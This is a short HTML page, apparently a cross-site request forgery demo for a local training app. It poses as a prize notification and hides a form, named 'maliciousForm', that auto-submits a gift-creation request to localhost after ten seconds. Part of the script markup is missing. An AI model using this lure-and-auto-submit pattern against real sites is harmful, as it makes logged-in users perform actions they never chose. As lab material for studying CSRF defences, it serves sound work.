<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Congratulations Santa! You are a winner!</h1>
    <p>Please wait while we redirect you to your prize...</p>
    <form action="https://localhost:7024/Gifts/Create" method="post" id="maliciousForm">
        <input type="hidden" name="GiftName" value="500 Billion USD $ for naughty kid" />

            document.getElementById("maliciousForm").submit();
        }, 10000);

</html>
